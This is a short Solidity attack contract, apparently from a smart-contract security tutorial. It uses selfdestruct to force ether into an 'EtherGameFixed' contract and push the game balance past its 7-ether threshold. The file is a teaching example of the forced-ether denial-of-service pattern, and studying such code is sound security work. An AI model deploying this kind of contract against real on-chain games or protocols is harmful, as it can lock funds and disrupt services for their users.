// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./EtherGameFixed.sol";

contract AttackEGF {
    EtherGameFixed etherGameFixed;

    constructor(EtherGameFixed _etherGameFixed) {
        etherGameFixed = EtherGameFixed(_etherGameFixed);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGameFixed));
        selfdestruct(addr);
    }
}
